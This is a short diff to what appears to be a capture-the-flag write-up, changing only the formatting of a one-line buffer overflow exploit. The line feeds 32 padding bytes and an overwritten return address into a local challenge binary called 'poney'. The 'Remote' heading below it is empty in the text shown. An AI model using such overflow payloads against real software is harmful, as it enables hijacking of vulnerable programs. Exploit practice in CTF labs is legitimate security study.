@@ -1,5 +1,5 @@
 Local:
-```powershell (python -c 'print "A"*32+"\x76\x06\x40\x00\x00\x00\x00\x00"';cat) | ./poney ```
+```(python -c 'print "A"*32+"\x76\x06\x40\x00\x00\x00\x00\x00"';cat) | ./poney ```
 
 Remote : 
 
